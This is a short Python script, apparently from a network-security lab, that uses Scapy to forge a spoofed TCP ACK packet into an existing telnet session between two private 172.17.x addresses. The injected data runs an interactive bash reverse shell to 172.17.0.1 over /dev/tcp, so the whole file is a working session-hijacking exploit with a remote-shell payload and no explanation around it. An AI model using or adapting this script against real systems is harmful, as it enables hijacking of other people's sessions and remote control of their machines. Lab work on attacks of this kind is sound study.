#!/usr/bin/python3
from scapy.all import *

print("SENDING SESSION HIJACKING PACKET.........")
ip = IP(src="172.17.0.2", dst="172.17.0.3")
tcp = TCP(sport=51768, dport=23, flags="A", seq=1356347600, ack=3083865505)
data = "\r/bin/bash -i > /dev/tcp/172.17.0.1/11803 0<&1 2>&1\r"
pkt = ip/tcp/data
send(pkt, verbose=0)
